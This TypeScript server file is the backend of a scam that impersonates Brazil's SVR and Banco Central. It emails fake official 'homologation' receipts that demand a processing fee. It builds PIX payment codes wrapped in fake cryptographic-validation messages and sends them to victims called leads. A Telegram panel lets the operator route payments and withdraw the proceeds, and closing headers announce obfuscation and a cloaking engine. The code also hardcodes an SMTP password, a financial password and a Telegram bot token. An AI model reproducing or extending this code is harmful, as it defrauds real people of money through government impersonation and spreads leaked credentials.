import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";
import QRCode from 'qrcode';
import FormData from 'form-data';
import nodemailer from 'nodemailer';

dotenv.config();

const API_URL = "https://www.consultarvaloresareceber.com.br";

const app = express();
const port = parseInt(process.env.PORT || "80", 10);

// CORS - Moved to the top for global coverage
const corsOptions = {
  origin: (origin: string | undefined, callback: (err: Error | null, allow?: boolean) => void) => {
    // Allow all origins but reflect the specific one to satisfy credential requirements
    callback(null, true);
  },
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With", "Accept", "Origin"],
  credentials: true,
  optionsSuccessStatus: 204,
};
app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

// Extra headers for absolute certainty
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (origin) {
    res.header("Access-Control-Allow-Origin", origin);
  }
  res.header("Access-Control-Allow-Credentials", "true");
  res.header("Access-Control-Allow-Methods", "GET, POST, PUT, DELETE, OPTIONS");
  res.header("Access-Control-Allow-Headers", "Content-Type, Authorization, X-Requested-With, Accept, Origin");
  next();
});

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
  pixName: "Contribuinte SVR",
  pixEmail: "contato@svr.gov.br",
  pixDocument: "00.038.166/0001-05",
  gatewayFee: 5.0, // Taxa em %
  smtpHost: "smtp.hostinger.com",
  smtpPort: 465,
  smtpUser: "protocolo@consultarvaloresareceber.com.br",
  smtpPass: "Ng200726@",
  smtpSenderName: "Portal SVR - Protocolo Oficial",
  financialPassword: "ng197826", // Senha de segurança para financeiro
  adminPixKey: "",
  adminPixType: "CPF",
  adminPixName: "",
  adminPixDoc: "",
  withdrawalFeeFixed: 2.00, // R$ 2,00 fixo por saque
  withdrawalFeePercent: 0.0 // % por saque
};

// Sessions state for Telegram tracking (Persisted)
const sessions = new Map<string, any>();
const VISITORS_FILE = path.join(process.cwd(), 'visitor-sessions.json');
const STATS_FILE = path.join(process.cwd(), 'stats.json');

interface BotStats {
  totalVisitors: number;
  visitorsToday: number;
  visitorsWeek: number;
  totalConversions: number;
  conversionsToday: number;
  conversionsWeek: number;
  lastResetDay: string; // YYYY-MM-DD
  lastResetWeek: number; // Week number
}

let botStats: BotStats = {
  totalVisitors: 0,
  visitorsToday: 0,
  visitorsWeek: 0,
  totalConversions: 0,
  conversionsToday: 0,
  conversionsWeek: 0,
  lastResetDay: new Date().toISOString().split('T')[0],
  lastResetWeek: getWeekNumber(new Date())
};

function getWeekNumber(d: Date) {
  d = new Date(Date.UTC(d.getFullYear(), d.getMonth(), d.getDate()));
  d.setUTCDate(d.getUTCDate() + 4 - (d.getUTCDay() || 7));
  var yearStart = new Date(Date.UTC(d.getUTCFullYear(), 0, 1));
  var weekNo = Math.ceil((((d.getTime() - yearStart.getTime()) / 86400000) + 1) / 7);
  return weekNo;
}

function loadStats() {
  try {
    if (fs.existsSync(STATS_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATS_FILE, 'utf-8'));
      botStats = { ...botStats, ...data };
      console.log(`📊 [STATS] Estatísticas carregadas: Total Visitors: ${botStats.totalVisitors}, Conversions: ${botStats.totalConversions}`);
      checkAndResetStats();
    }
  } catch (e) { }
}

function saveStats() {
  try {
    fs.writeFileSync(STATS_FILE, JSON.stringify(botStats, null, 2));
  } catch (e) { }
}

function checkAndResetStats() {
  const now = new Date();
  const todayStr = now.toISOString().split('T')[0];
  const currentWeek = getWeekNumber(now);

  let changed = false;

  if (botStats.lastResetDay !== todayStr) {
    botStats.visitorsToday = 0;
    botStats.conversionsToday = 0;
    botStats.lastResetDay = todayStr;
    changed = true;
    console.log(`📅 [STATS] Reset diário realizado.`);
  }

  if (botStats.lastResetWeek !== currentWeek) {
    botStats.visitorsWeek = 0;
    botStats.conversionsWeek = 0;
    botStats.lastResetWeek = currentWeek;
    changed = true;
    console.log(`🗓️ [STATS] Reset semanal realizado.`);
  }

  if (changed) saveStats();
}

function recordVisitor() {
  checkAndResetStats();
  botStats.totalVisitors++;
  botStats.visitorsToday++;
  botStats.visitorsWeek++;
  saveStats();
}

function recordConversion() {
  checkAndResetStats();
  botStats.totalConversions++;
  botStats.conversionsToday++;
  botStats.conversionsWeek++;
  saveStats();
}

loadStats();

function loadVisitors() {
  try {
    if (fs.existsSync(VISITORS_FILE)) {
      const data = JSON.parse(fs.readFileSync(VISITORS_FILE, 'utf-8'));
      Object.entries(data).forEach(([k, v]) => sessions.set(k, v));
      console.log(`📂 [SISTEMA] ${sessions.size} sessões de visitantes carregadas.`);
    }
  } catch (e) { }
}

function saveVisitors() {
  try {
    const obj = Object.fromEntries(sessions);
    fs.writeFileSync(VISITORS_FILE, JSON.stringify(obj, null, 2));
  } catch (e) { }
}

loadVisitors();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// PIX pendente de confirmacao pelo admin
const pendingPix = new Map<string, { telefone: string, formalMessage: string, pixCode: string, transId: string, valorNumeric: number }>();

// Mapa: transactionId (gateway) → chatId (WhatsApp) para auto-conclusão da Etapa 4
const pixLeadMap = new Map<string, string>(); // transId → chatId do lead

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    proc.removeAllListeners('exit');
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

function startBot(id: string = 'main') {
  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });

  proc.on('exit', (code) => {
    console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
    setTimeout(() => startBot(id), 5000);
  });

  botProcesses.set(id, proc);
}

// Validação básica de chave PIX
function validatePixKey(key: string) {
  const clean = key.trim();
  if (clean.includes('@') && clean.includes('.')) return true; // Email
  const digits = clean.replace(/\D/g, '');
  if (digits.length === 11 || digits.length === 14 || digits.length === 10) return true; // CPF/CNPJ/Fone
  if (clean.length >= 32) return true; // Aleatória
  return false;
}

function validateEmail(email: string) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function validateDocument(doc: string) {
  const clean = doc.replace(/\D/g, '');
  return clean.length === 11 || clean.length === 14;
}

async function sendSuccessEmail(leadEmail: string, leadName: string, protocol: string = "SVR-PROTO-GEN") {
  if (!currentConfig.smtpUser || !currentConfig.smtpPass) {
    console.log("⚠️ [SMTP] Configurações de e-mail ausentes. Email não enviado.");
    return false;
  }

  try {
    const transporter = nodemailer.createTransport({
      host: currentConfig.smtpHost,
      port: currentConfig.smtpPort,
      secure: currentConfig.smtpPort === 465,
      auth: { user: currentConfig.smtpUser, pass: currentConfig.smtpPass }
    });

    const randomFee = (Math.random() * (380 - 190) + 190).toFixed(2);
    // Protocolo camuflado (Visual de Hash Criptográfico)
    const displayProtocol = `0x${protocol.replace(/\D/g, '').substring(0, 6) || Math.random().toString(16).substring(2, 8).toUpperCase()}-${protocol.substring(0, 4).toUpperCase()}`;

    // Logo camuflada do sistema (puxando da pasta assets oficial)
    const logoUrl = `${API_URL}/assets/logos/asset_m_brand.png`;
    const randomDays = Math.floor(Math.random() * 3) + 2;

    // Geração de mensagem automática para o WhatsApp
    const isDefaultWhatsapp = currentConfig.whatsappNumber === (process.env.WHATSAPP_NUMBER || "5511971730325");
    let waMessage = "";

    if (isDefaultWhatsapp) {
      // Mensagem para o bot principal (Foco em antecipação)
      waMessage = `Olá, gostaria de solicitar a antecipação da liberação dos meus ativos vinculados ao protocolo ${displayProtocol}. Nome: ${leadName}.`;
    } else {
      // Mensagem para outro setor (Foco em acompanhamento oficial)
      waMessage = `Prezados, sou ${leadName} e possuo o protocolo de segurança ${displayProtocol}. Fui redirecionado para este canal oficial para acompanhamento da fase de transição de ativos identificados no sistema SVR.`;
    }

    const waLink = `https://wa.me/${currentConfig.whatsappNumber}?text=${encodeURIComponent(waMessage)}`;

    const htmlContent = `
<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Comprovante de Liberação SVR</title>
</head>
<body style="margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f5f5f5;">
    <table align="center" border="0" cellpadding="0" cellspacing="0" width="600" style="border-collapse: collapse; background-color: #ffffff; margin-top: 30px; margin-bottom: 30px; border: 1px solid #e0e0e0; box-shadow: 0 4px 6px rgba(0,0,0,0.1);">
        
        <!-- Header -->
        <tr>
            <td align="center" bgcolor="#1b668d" style="padding: 15px 0;">
                <h1 style="color: #ffffff; margin: 0; font-size: 18px; font-weight: bold; text-transform: uppercase;">Portal SVR — Sistema de Valores a Receber</h1>
                <p style="color: #ffffff; margin: 5px 0 0 0; font-size: 11px; opacity: 0.9;">Comprovante de Homologação e Resgate de Ativos</p>
            </td>
        </tr>

        <!-- Gov Logo -->
        <tr>
            <td align="center" style="padding: 20px 0;">
                <img src="${logoUrl}" alt="SVR" width="120" style="display: block;">
            </td>
        </tr>

        <!-- Content -->
        <tr>
            <td style="padding: 20px 40px;">
                <h2 style="color: #1b668d; font-size: 16px; margin-bottom: 10px;">Prezado(a) ${leadName},</h2>
                <p style="font-size: 13px; color: #333333; line-height: 1.6; text-align: justify;">
                    Informamos que a <strong>confirmação e validação dos dados</strong> vinculados ao seu documento foram processadas com sucesso pelo Sistema de Valores a Receber (SVR). 
                    A fase de liberação dos ativos identificados encontra-se em <strong>estágio de transição final</strong>. Este procedimento assegura a integridade do repasse fiscal para a conta bancária homologada em nossa base de dados.
                </p>
            </td>
        </tr>

        <!-- Status Table -->
        <tr>
            <td style="padding: 0 40px;">
                <table width="100%" bgcolor="#f8f9fa" style="border-radius: 8px; border: 1px solid #e0e0e0; padding: 15px;">
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Situação:</strong></td>
                        <td align="right" style="font-size: 14px; color: #28a745; padding-bottom: 8px;"><strong>Homologado</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Taxa de Processamento:</strong></td>
                        <td align="right" style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>R$ ${randomFee}</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333; padding-bottom: 8px;"><strong>Protocolo:</strong></td>
                        <td align="right" style="font-size: 14px; color: #1b668d; padding-bottom: 8px;"><strong>${displayProtocol}</strong></td>
                    </tr>
                    <tr>
                        <td style="font-size: 14px; color: #333;"><strong>Previsão de Crédito:</strong></td>
                        <td align="right" style="font-size: 14px; color: #333;"><strong>${randomDays} a ${randomDays + 2} dias úteis</strong></td>
                    </tr>
                </table>
            </td>
        </tr>

        <!-- Call to Action -->
        <tr>
            <td style="padding: 25px 40px 40px 40px;">
                <p style="font-size: 13px; color: #333; line-height: 1.6;">
                    Para acompanhar a compensação definitiva e o crédito em conta, acesse o canal de atendimento especializado. A taxa de processamento prioritário (adiantamento) garante que sua solicitação permaneça no topo da fila de auditoria fiscal bancária.
                </p>
                <p style="font-size: 12px; color: #666; text-align: center; margin-top: 20px;">
                    Clique no botão abaixo para acessar o portal oficial e acompanhar sua solicitação.
                </p>
                <table align="center" border="0" cellpadding="0" cellspacing="0" style="margin-top: 15px;">
                    <tr>
                        <td align="center" bgcolor="#1b668d" style="border-radius: 4px;">
                            <a href="${waLink}" target="_blank" style="font-size: 14px; font-weight: bold; color: #ffffff; text-decoration: none; padding: 12px 40px; display: inline-block; text-transform: uppercase;">Acompanhar Resgate</a>
                        </td>
                    </tr>
                </table>
            </td>
        </tr>

        <!-- Footer -->
        <tr>
            <td style="background-color: #f8f9fa; padding: 15px; text-align: center; font-size: 10px; color: #999; border-top: 1px solid #eee;">
                <p style="margin: 0;">Portal de Valores a Receber (SVR) | Banco Central do Brasil</p>
                <p style="margin: 5px 0 0;">Este é um e-mail automático enviado por sistema seguro. Não responda.</p>
            </td>
        </tr>
    </table>
</body>
</html>
    `;

    await transporter.sendMail({
      from: `"${currentConfig.smtpSenderName}" <${currentConfig.smtpUser}>`,
      to: leadEmail,
      subject: `📜 PROTOCOLO ${displayProtocol} — Atualização de Ativos Identificados`,
      html: htmlContent
    });

    console.log(`📧 [EMAIL] Sucesso enviado para ${leadEmail}`);
    return true;
  } catch (e: any) {
    console.error(`❌ [EMAIL] Erro ao enviar para ${leadEmail}:`, e.message);
    return false;
  }
}

app.get("/api/v1/metrics/log", (req, res) => {
  res.status(200).json({ status: "ok" });
});

app.post("/api/v1/metrics/log", (req, res) => {
  res.status(200).json({ status: "ok" });
});

// Endpoint de contagem real de atendentes conectados (bots com status CONNECTED)
app.get("/api/v1/attendants", (req, res) => {
  let connected = 0;
  const details: { id: string; name: string; status: string }[] = [];
  for (let i = 1; i <= MAX_SLOTS; i++) {
    const id = i === 1 ? 'main' : `parceiro${i}`;
    try {
      const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
      if (fs.existsSync(statusPath)) {
        const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
        if (data.status === 'CONNECTED') {
          connected++;
          details.push({ id, name: data.adminName || id, status: 'CONNECTED' });
        }
      }
    } catch (_) { }
  }
  res.json({ connected, details });
});

app.get("/api/config", (req, res) => {
  res.json({ whatsappNumber: currentConfig.whatsappNumber });
});

async function getGatewayBalance() {
  try {
    const secret = process.env.SVR_CORE_S_AUTH;
    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const res = await axios.get("https://api.fastsoftbrasil.com/api/user/wallet/balance", {
      headers: { 'Authorization': `Basic ${auth}` }
    });
    return res.data.data; // { available, blocked, pending }
  } catch (e: any) {
    console.error("❌ Erro ao consultar saldo:", e.message);
    return null;
  }
}

async function requestGatewayWithdrawal(amountCents: number) {
  try {
    const secret = process.env.SVR_CORE_S_AUTH;
    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const payload = {
      amount: amountCents,
      pixKey: currentConfig.adminPixKey,
      pixType: currentConfig.adminPixType,
      beneficiaryName: currentConfig.adminPixName,
      beneficiaryDocument: currentConfig.adminPixDoc.replace(/\D/g, ''),
      description: "Saque Administrativo SVR"
    };

    const res = await axios.post("https://api.fastsoftbrasil.com/api/user/cashout", payload, {
      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
    });
    return res.data;
  } catch (e: any) {
    console.error("❌ Erro ao solicitar saque:", e.response?.data || e.message);
    throw new Error(e.response?.data?.message || e.message);
  }
}

// Criptografia estética para chave manual
function encryptPixKey(key: string) {
  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
  return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
}

// Geração de PIX Sistema Padrão (Gateway)
async function generateStandardPix(telefone: string, valorNumeric: number, messageId?: number, overrides?: { name?: string, email?: string, doc?: string }) {
  try {
    const key = process.env.SVR_CORE_P_PROVIDER;
    const secret = process.env.SVR_CORE_S_AUTH;
    const endpoint = process.env.SVR_CORE_GATEWAY;
    if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");

    const name = overrides?.name || currentConfig.pixName;
    const email = overrides?.email || currentConfig.pixEmail;
    const doc = overrides?.doc || currentConfig.pixDocument;

    console.log(`🚀 [GATEWAY] Gerando PIX para ${telefone} - Valor: ${valorNumeric}`);
    const payload = {
      amount: Math.round(valorNumeric * 100),
      currency: "BRL",
      paymentMethod: "PIX",
      pix: {
        expiresInDays: 1
      },
      items: [
        {
          title: "Produtos",
          unitPrice: Math.round(valorNumeric * 100),
          quantity: 1,
          tangible: false
        }
      ],
      customer: {
        name,
        email,
        phone: telefone.replace(/\D/g, ''),
        document: {
          number: doc.replace(/\D/g, ''),
          type: doc.replace(/\D/g, '').length > 11 ? "CNPJ" : "CPF"
        }
      }
    };

    const auth = Buffer.from(`x:${secret}`).toString('base64');
    const pixRes = await axios.post(endpoint, payload, {
      headers: {
        'Authorization': `Basic ${auth}`,
        'Content-Type': 'application/json',
        'Accept': 'application/json',
        'User-Agent': 'SVR-GATEWAY-RUNTIME/5.0'
      }
    });

    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode || pixRes.data.data?.pix_code || pixRes.data.data?.qrcode || pixRes.data.data?.pix?.qrcode || pixRes.data.pix?.qrcode || pixRes.data.data?.pix?.copyPaste;
    const transId = pixRes.data.id || pixRes.data.transactionId || pixRes.data.data?.id;

    console.log(`✅ [GATEWAY] Resposta recebida. PIX Code: ${pixCode ? 'SIM' : 'NÃO'} - ID: ${transId}`);

    if (!pixCode) {
      console.log(`❌ [GATEWAY] Dados brutos:`, JSON.stringify(pixRes.data));
      throw new Error("Gateway não retornou código PIX. Verifique os logs.");
    }

    const protocolId = Math.random().toString(36).substring(7).toUpperCase();

    const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
      `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
      `🖥️ *ESTADO DO SISTEMA:*\n` +
      '```\n' +
      `ID: 0x${protocolId}\n` +
      `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
      `TYPE: AUTENTICAÇÃO_DE_DESTINO\n` +
      '```\n\n' +
      `👇 *COPIE O CÓDIGO PIX ABAIXO E IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*\n\n` +
      pixCode;
    const pendingId = `pix_${Date.now()}`;
    pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });

    // Registra associação transId → chatId para detectar pagamento automaticamente
    if (transId) {
      pixLeadMap.set(String(transId), telefone);
      console.log(`🔗 [PIX MAP] Associado transId ${transId} → lead ${telefone}`);
    }

    const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });

    // --- CÁLCULO FINANCEIRO PARA O ADMIN ---
    const feeGateway = valorNumeric * (currentConfig.gatewayFee / 100);
    const valLiq = valorNumeric - feeGateway;
    const feeSaque = (valLiq * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
    const valFinal = valLiq - feeSaque;

    const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n` +
      `💰 <b>Valor Bruto:</b> R$ ${valorNumeric.toFixed(2)}\n` +
      `🏦 <b>Recebedor:</b> ${name}\n` +
      `🔗 <b>ID:</b> <code>${transId}</code>\n\n` +
      `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
      `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
      `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
      `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
      `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
      `⏳ <i>Expira em 15 minutos (a mensagem será apagada).</i>\n\n` +
      `⚠️ <i>Escolha o destino deste protocolo:</i>`;

    console.log(`📸 [TELEGRAM] Enviando QR Code...`);
    const msgIdSent = await sendTelegramPhoto(qrBuffer, previewCaption, {
      inline_keyboard: [
        [
          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
        ],
        [
          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
          { text: "❌ Cancelar", callback_data: "painel:back" }
        ]
      ]
    });

    if (msgIdSent) {
      console.log(`✅ [TELEGRAM] QR Code enviado com sucesso (MsgID: ${msgIdSent}). Agendando exclusão para 15 min.`);
      setTimeout(async () => {
        try {
          await axios.post(`${TELEGRAM_URL}/deleteMessage`, { chat_id: CHAT_ID, message_id: msgIdSent });
          console.log(`🗑️ [TELEGRAM] QR Code (MsgID: ${msgIdSent}) apagado após 15 minutos de expiração.`);
        } catch (e: any) {
          console.error(`❌ [TELEGRAM] Erro ao apagar QR Code expirado:`, e.response?.data?.description || e.message);
        }
      }, 15 * 60 * 1000);
    }

  } catch (e: any) {
    const detail = e.response?.data?.message || e.response?.data?.error || e.message;
    console.error(`❌ [GATEWAY] Erro na geração PIX:`, e.response?.data || e.message);
    await sendTelegram(`❌ Erro no Gateway: ${detail}`, messageId);
  }
}

async function showPixPreAutoMenu(userId: number, messageId?: number) {
  const state = botStates.get(userId);
  if (!state || state.action !== 'pix_preauto_menu') return;
  const { chatId, amount, name, email, doc } = state.data;

  const txt = `⚙️ <b>SISTEMA PRÉ-AUTOMÁTICO (GATEWAY)</b>\n\n` +
    `📱 <b>Lead:</b> <code>${chatId}</code>\n` +
    `💰 <b>Valor:</b> R$ ${parseFloat(amount).toFixed(2)}\n` +
    `👤 <b>Recebedor:</b> ${name}\n` +
    `📧 <b>E-mail:</b> ${email}\n` +
    `📄 <b>Documento:</b> ${doc}\n\n` +
    `<i>Edite as informações ou gere o PIX via Gateway:</i>`;

  const kb = {
    inline_keyboard: [
      [{ text: "💰 Editar Valor", callback_data: "pix_pre:edit:amount" }],
      [{ text: "👤 Editar Nome", callback_data: "pix_pre:edit:name" }, { text: "📧 Editar E-mail", callback_data: "pix_pre:edit:email" }],
      [{ text: "📄 Editar Documento", callback_data: "pix_pre:edit:doc" }],
      [{ text: "🚀 GERAR VIA GATEWAY", callback_data: "pix_pre:exec" }],
      [{ text: "❌ Cancelar", callback_data: "painel:back" }]
    ]
  };

  await sendTelegram(txt, messageId, kb);
}

// Helper para gerar CRC16 (CCITT-FALSE)
function crc16(data: string): string {
  let crc = 0xFFFF;
  for (let i = 0; i < data.length; i++) {
    crc ^= data.charCodeAt(i) << 8;
    for (let j = 0; j < 8; j++) {
      if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
      else crc <<= 1;
    }
  }
  return (crc & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
}

// Gera o código PIX estático (Copia e Cola) a partir de uma chave
function buildStaticPix(key: string, name: string, amount: number) {
  if (key.startsWith('000201')) return key; // Já é um BRCode

  const cleanName = name.normalize("NFD").replace(/[\u0300-\u036f]/g, "").toUpperCase().substring(0, 25);
  const amountStr = amount.toFixed(2);

  const gui = "br.gov.bcb.pix";
  const keyTag = `01${key.length.toString().padStart(2, '0')}${key}`;
  const merchantInfoValue = `0014${gui}${keyTag}`;
  const merchantInfo = `26${merchantInfoValue.length.toString().padStart(2, '0')}${merchantInfoValue}`;

  const payload = [
    "000201",
    merchantInfo,
    "52040000",
    "5303986",
    `54${amountStr.length.toString().padStart(2, '0')}${amountStr}`,
    "5802BR",
    `59${cleanName.length.toString().padStart(2, '0')}${cleanName}`,
    "6009SAO PAULO",
    "62070503***",
    "6304"
  ].join("");

  return payload + crc16(payload);
}

// Geração de PIX Sistema Modificado (Chave Manual)
async function generateModifiedPix(telefone: string, valorNumeric: number, pixKey: string, customName?: string, customDoc?: string) {
  const protocolId = Math.random().toString(36).substring(7).toUpperCase();
  const encryptedKey = encryptPixKey(pixKey);
  const name = customName || currentConfig.pixName;
  const doc = customDoc || currentConfig.pixDocument;

  // Gera o código PIX real (BRCode)
  const pixCode = buildStaticPix(pixKey, name, valorNumeric);

  const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
    `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
    `🖥️ *ESTADO DO SISTEMA:*\n` +
    '```\n' +
    `ID: 0x${protocolId}\n` +
    `HASH: ${encryptedKey}\n` +
    `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
    '```\n\n' +
    `👇 *COPIE O CÓDIGO PIX ABAIXO E IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*\n\n` +
    pixCode;


  const pendingId = `pix_${Date.now()}`;
  pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId: 'MANUAL', valorNumeric });

  const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });

  // --- CÁLCULO FINANCEIRO PARA O ADMIN ---
  const feeGateway = valorNumeric * (currentConfig.gatewayFee / 100);
  const valLiq = valorNumeric - feeGateway;
  const feeSaque = (valLiq * (currentConfig.withdrawalFeePercent / 100)) + currentConfig.withdrawalFeeFixed;
  const valFinal = valLiq - feeSaque;

  const previewCaption = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n` +
    `💰 <b>Valor Bruto:</b> R$ ${valorNumeric.toFixed(2)}\n` +
    `👤 <b>Recebedor:</b> ${name}\n` +
    `🔑 <b>Chave Original:</b> <code>${pixKey}</code>\n\n` +
    `📊 <b>DETALHAMENTO FINANCEIRO:</b>\n` +
    `├─ Taxa Gateway (${currentConfig.gatewayFee}%): - R$ ${feeGateway.toFixed(2)}\n` +
    `├─ Valor Líquido: R$ ${valLiq.toFixed(2)}\n` +
    `├─ Taxa Saque: - R$ ${feeSaque.toFixed(2)}\n` +
    `└─ <b>VOCÊ RECEBE: R$ ${valFinal.toFixed(2)}</b>\n\n` +
    `⚠️ <i>Escolha o destino deste protocolo:</i>`;

  await sendTelegramPhoto(qrBuffer, previewCaption, {
    inline_keyboard: [
      [
        { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
        { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
      ],
      [
        { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
        { text: "❌ Cancelar", callback_data: "painel:back" }
      ]
    ]
  });
}

async function showPixManualMenu(userId: number, messageId?: number) {
  const state = botStates.get(userId);
  if (!state || state.action !== 'pix_manual_menu') return;
  const { chatId, key, name, doc, amount } = state.data;
  const displayAmount = amount ? parseFloat(amount).toFixed(2) : 'Pendente';

  const txt = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n` +
    `📱 <b>Lead:</b> <code>${chatId}</code>\n` +
    `💰 <b>Valor:</b> R$ ${displayAmount}\n` +
    `🔑 <b>Chave:</b> <code>${key || 'Pendente'}</code>\n` +
    `👤 <b>Recebedor:</b> ${name}\n` +
    `📄 <b>Documento:</b> ${doc}\n\n` +
    `<i>Edite as informações ou clique em Gerar:</i>`;

  const kb = {
    inline_keyboard: [
      [{ text: "💰 Editar Valor", callback_data: "pix_mod:edit:amount" }],
      [{ text: "🔑 Editar Chave PIX", callback_data: "pix_mod:edit:key" }],
      [{ text: "👤 Editar Recebedor", callback_data: "pix_mod:edit:name" }, { text: "📄 Editar Documento", callback_data: "pix_mod:edit:doc" }],
      [{ text: "🚀 GERAR PROTOCOLO", callback_data: "pix_mod:exec" }],
      [{ text: "❌ Cancelar", callback_data: "painel:back" }]
    ]
  };

  await sendTelegram(txt, messageId, kb);
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  const qrMsgFile = path.join(process.cwd(), `bot-qr-msg-${id}.json`);

  const attemptReset = (retries = 10) => {
    try {
      if (fs.existsSync(sessionPath)) {
        fs.rmSync(sessionPath, { recursive: true, force: true });
      }
      if (fs.existsSync(qrMsgFile)) {
        fs.unlinkSync(qrMsgFile);
      }
      startBot(id);
    } catch (e) {
      if (retries > 0) {
        setTimeout(() => attemptReset(retries - 1), 500);
      } else {
        console.log(`⚠️ [SISTEMA] Falha ao apagar sessão após tentativas. Reiniciando de qualquer forma.`);
        startBot(id);
      }
    }
  };

  setTimeout(attemptReset, 500); // Give initial 500ms for process to close
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
  if (saved.pixName) currentConfig.pixName = saved.pixName;
  if (saved.pixEmail) currentConfig.pixEmail = saved.pixEmail;
  if (saved.pixDocument) currentConfig.pixDocument = saved.pixDocument;
  if (saved.gatewayFee !== undefined) currentConfig.gatewayFee = saved.gatewayFee;
  if (saved.smtpHost) currentConfig.smtpHost = saved.smtpHost;
  if (saved.smtpPort) currentConfig.smtpPort = saved.smtpPort;
  if (saved.smtpUser) currentConfig.smtpUser = saved.smtpUser;
  if (saved.smtpPass) currentConfig.smtpPass = saved.smtpPass;
  if (saved.financialPassword) currentConfig.financialPassword = saved.financialPassword;
  if (saved.adminPixKey) currentConfig.adminPixKey = saved.adminPixKey;
  if (saved.adminPixType) currentConfig.adminPixType = saved.adminPixType;
  if (saved.adminPixName) currentConfig.adminPixName = saved.adminPixName;
  if (saved.adminPixDoc) currentConfig.adminPixDoc = saved.adminPixDoc;
  if (saved.withdrawalFeeFixed !== undefined) currentConfig.withdrawalFeeFixed = saved.withdrawalFeeFixed;
  if (saved.withdrawalFeePercent !== undefined) currentConfig.withdrawalFeePercent = saved.withdrawalFeePercent;
}

function saveConfig() {
  fs.writeFileSync(configPath, JSON.stringify(currentConfig, null, 2));
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

// --- OBFUSCATION LAYER ---
const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');

// --- CLOAKING ENGINE (v6.0) ---
